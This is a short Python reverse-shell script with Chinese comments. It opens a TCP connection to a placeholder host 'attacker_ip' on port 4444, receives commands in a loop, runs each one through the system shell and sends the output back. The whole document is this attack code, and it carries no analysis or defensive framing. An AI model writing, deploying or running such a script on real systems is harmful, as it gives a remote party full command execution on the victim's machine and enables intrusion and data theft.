import socket
import subprocess

# 設置目標IP與端口
target_ip = "attacker_ip"
target_port = 4444

# 建立反向連接
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, target_port))

# 接收命令並執行
while True:
    command = sock.recv(1024).decode('utf-8')
    if command.lower() == 'exit':
        break
    output = subprocess.run(command, shell=True, capture_output=True)
    sock.send(output.stdout + output.stderr)

sock.close()
